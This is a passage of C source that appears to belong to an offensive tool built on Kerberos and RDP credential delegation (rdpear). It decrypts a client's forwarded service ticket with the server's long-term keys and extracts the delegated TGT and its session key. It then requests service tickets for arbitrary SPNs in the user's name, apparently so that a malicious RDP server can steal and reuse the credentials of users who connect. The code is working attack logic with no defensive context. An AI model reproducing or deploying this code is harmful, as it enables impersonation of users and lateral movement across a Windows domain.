		tgs_request.request_body.kdc_options.length = sizeof(kdc_options) * 8;

		tgs_request.request_body.realm = (KERB_REALM)domain;

		tgs_request.request_body.bit_mask |= KERB_KDC_REQUEST_BODY_server_name_present;
		tgs_request.request_body.server_name.name_type = kerb_NT_SRV_INST;
		tgs_request.request_body.server_name.name_string = server_names;

		tgs_request.request_body.endtime.year = 2100;
		tgs_request.request_body.endtime.month = 9;
		tgs_request.request_body.endtime.day = 13;
		tgs_request.request_body.endtime.hour = 2;
		tgs_request.request_body.endtime.minute = 48;
		tgs_request.request_body.endtime.second = 5;
		tgs_request.request_body.endtime.millisecond = 0;
		tgs_request.request_body.endtime.universal = 1;
		tgs_request.request_body.endtime.diff = 0;

		tgs_request.request_body.nonce = rand();
		tgs_request.request_body.encryption_type = encryption_types;

		ULONG cbTgsChecksum = 0;
		PVOID pvTgsChecksum = NULL;

		if (tsssp_rdpear_send_kerb_request_compute_tgs_checksum(server_context, client_context, key, &tgs_request.request_body, &pvTgsChecksum, &cbTgsChecksum))
		{
			ULONG cbApReqAuthenticator = 0;
			PVOID pvApReqAuthenticator = NULL;

			if (tsssp_rdpear_send_kerb_request_create_ap_req_authenticator(server_context, client_context, key, pvTgsChecksum, cbTgsChecksum, &pvApReqAuthenticator, &cbApReqAuthenticator))
			{
				KERB_ENCRYPTED_DATA* ap_req_authenticator = NULL;

				if (asn1_decode_kerb(pvApReqAuthenticator, cbApReqAuthenticator, KERB_ENCRYPTED_DATA_PDU, &ap_req_authenticator))
				{
					BYTE ap_options[4];
					memset(ap_options, 0, sizeof(ap_options));

					KERB_AP_REQUEST ap_request;
					memset(&ap_request, 0, sizeof(ap_request));

					ap_request.version = 5;
					ap_request.message_type = kerb_mt_KrbApReq;

					ap_request.ap_options.value = ap_options;
					ap_request.ap_options.length = sizeof(ap_options) * 8;

					memcpy(&ap_request.ticket, tgt, sizeof(KERB_TICKET));
					memcpy(&ap_request.authenticator, ap_req_authenticator, sizeof(KERB_ENCRYPTED_DATA));

					ULONG cbApRequest = 0;
					PVOID pvApRequest = NULL;

					if (asn1_encode_kerb(&ap_request, KERB_AP_REQUEST_PDU, &pvApRequest, &cbApRequest))
					{
						BYTE pac_options[4];
						memset(pac_options, 0, sizeof(pac_options));

						kerb_set_bitstring32(pac_options, kerb_pac_opt_BranchAware);

						KERB_PA_PAC_OPTIONS pa_pac_options;
						memset(&pa_pac_options, 0, sizeof(pa_pac_options));

						pa_pac_options.pac_flags.value = pac_options;
						pa_pac_options.pac_flags.length = sizeof(pac_options) * 8;

						ULONG cbPaPacOptions = 0;
						PVOID pvPaPacOptions = NULL;

						if (asn1_encode_kerb(&pa_pac_options, KERB_PA_PAC_OPTIONS_PDU, &pvPaPacOptions, &cbPaPacOptions))
						{
							KERB_KDC_REQUEST_preauth_data_Element pa_data[2];
							pa_data[0].value.preauth_data_type = kerb_PA_TGS_REQ;
							pa_data[0].value.preauth_data.value = pvApRequest;
							pa_data[0].value.preauth_data.length = cbApRequest;
							pa_data[0].next = &pa_data[1];
							pa_data[1].value.preauth_data_type = kerb_PA_PAC_OPTIONS;
							pa_data[1].value.preauth_data.value = pvPaPacOptions;
							pa_data[1].value.preauth_data.length = cbPaPacOptions;
							pa_data[1].next = NULL;

							tgs_request.bit_mask |= KERB_KDC_REQUEST_preauth_data_present;
							tgs_request.preauth_data = pa_data;

							ULONG cbTgsRequest = 0;
							PVOID pvTgsRequest = NULL;

							if (asn1_encode_kerb(&tgs_request, KERB_TGS_REQUEST_PDU, &pvTgsRequest, &cbTgsRequest))
							{
								ULONG cbTgsReply = 0;
								PVOID pvTgsReply = NULL;

								if (kerb_send_kdc_request(domain, pvTgsRequest, cbTgsRequest, &pvTgsReply, &cbTgsReply))
								{
									ULONG cbEncTgsReply = 0;
									PVOID pvEncTgsReply = NULL;

									if (tsssp_rdpear_send_kerb_request_unpack_kdc_reply_body(server_context, client_context, key, pvTgsReply, cbTgsReply, &pvEncTgsReply, &cbEncTgsReply))
									{
										if (tsssp_rdpear_send_kerb_request_reformat(pvTgsReply, cbTgsReply, pvEncTgsReply, cbEncTgsReply))
											result = TRUE;

										free(pvEncTgsReply);
									}

									free(pvTgsReply);
								}

								free(pvTgsRequest);
							}

							free(pvPaPacOptions);
						}

						free(pvApRequest);
					}

					asn1_free_kerb(ap_req_authenticator, KERB_ENCRYPTED_DATA_PDU);
				}

				free(pvApReqAuthenticator);
			}

			free(pvTgsChecksum);
		}
	}

	return result;
}

BOOL tsssp_rdpear_send_kerb_request_service_ticket(TSSSP_SERVER_CONTEXT* server_context, TSSSP_CLIENT_CONTEXT* client_context, LPCSTR domain, LPCSTR spn)
{
	BOOL result = FALSE;

	KERB_TICKET_LOGON* primary_creds = (KERB_TICKET_LOGON*)server_context->pvPrimaryCreds;

	if (server_context->pvPrimaryCreds != NULL &&
		server_context->cbPrimaryCreds >= sizeof(KERB_TICKET_LOGON) && 
		server_context->cbPrimaryCreds >= (uintptr_t)primary_creds->ServiceTicket + primary_creds->ServiceTicketLength && 
		server_context->cbPrimaryCreds >= (uintptr_t)primary_creds->TicketGrantingTicket + primary_creds->TicketGrantingTicketLength)
	{
		KERB_TICKET* service_ticket = NULL;

		if (asn1_decode_kerb((BYTE*)primary_creds + (uintptr_t)primary_creds->ServiceTicket, primary_creds->ServiceTicketLength, KERB_TICKET_PDU, &service_ticket))
		{
			ULONG cbLongTermKey = 0;
			PVOID pvLongTermKey = NULL;

			switch (service_ticket->encrypted_part.encryption_type)
			{
			case kerb_etype_rc4_hmac:
				cbLongTermKey = 16;
				pvLongTermKey = server_context->spnego.kerb.longterm_key_rc4;
				break;
			case kerb_etype_aes128:
				cbLongTermKey = 16;
				pvLongTermKey = server_context->spnego.kerb.longterm_key_aes128;
				break;
			case kerb_etype_aes256:
				cbLongTermKey = 32;
				pvLongTermKey = server_context->spnego.kerb.longterm_key_aes256;
				break;
			default:
				printf("Kerberos redirected service ticket was encrypted with unsupported etype: %d\n", service_ticket->encrypted_part.encryption_type);
				break;
			}

			if (pvLongTermKey != NULL && cbLongTermKey != 0)
			{
				ULONG cbEncTicket = 0;
				PVOID pvEncTicket = NULL;

				if (kerb_decrypt(service_ticket->encrypted_part.encryption_type, kerb_ku_AsRepTgsRep, pvLongTermKey, cbLongTermKey,
					service_ticket->encrypted_part.cipher_text.value, service_ticket->encrypted_part.cipher_text.length, &pvEncTicket, &cbEncTicket))
				{
					KERB_ENCRYPTED_TICKET* enc_ticket = NULL;

					if (asn1_decode_kerb(pvEncTicket, cbEncTicket, KERB_ENCRYPTED_TICKET_PDU, &enc_ticket))
					{
						KERB_CRED* kerb_cred = NULL;

						if (asn1_decode_kerb((BYTE*)primary_creds + (uintptr_t)primary_creds->TicketGrantingTicket, primary_creds->TicketGrantingTicketLength, KERB_CRED_PDU, &kerb_cred))
						{
							ULONG cbEncCred = 0;
							PVOID pvEncCred = NULL;

							if (kerb_decrypt(kerb_cred->encrypted_part.encryption_type, kerb_ku_KrbCredEncryptedPart, enc_ticket->key.keyvalue.value, enc_ticket->key.keyvalue.length,
								kerb_cred->encrypted_part.cipher_text.value, kerb_cred->encrypted_part.cipher_text.length, &pvEncCred, &cbEncCred))
							{
								KERB_ENCRYPTED_CRED* enc_cred = NULL;

								if (asn1_decode_kerb(pvEncCred, cbEncCred, KERB_ENCRYPTED_CRED_PDU, &enc_cred))
								{
									KERBISO_REMOTE_ENCRYPTION_KEY encryption_key;
									memset(&encryption_key, 0, sizeof(encryption_key));

									encryption_key.KeyType = enc_cred->ticket_info->value.key.keytype;
									encryption_key.KeyValue.Value = enc_cred->ticket_info->value.key.keyvalue.value;
									encryption_key.KeyValue.Length = enc_cred->ticket_info->value.key.keyvalue.length;

									result = tsssp_rdpear_send_kerb_request_tgs(server_context, client_context, domain, spn, &kerb_cred->tickets->value, &encryption_key);

									asn1_free_kerb(enc_cred, KERB_ENCRYPTED_CRED_PDU);
								}

								free(pvEncCred);
							}

							asn1_free_kerb(kerb_cred, KERB_CRED_PDU);
						}

						asn1_free_kerb(enc_ticket, KERB_ENCRYPTED_TICKET_PDU);
					}

					free(pvEncTicket);
				}
			}

			asn1_free_kerb(service_ticket, KERB_TICKET_PDU);
		}
	}

	return result;
}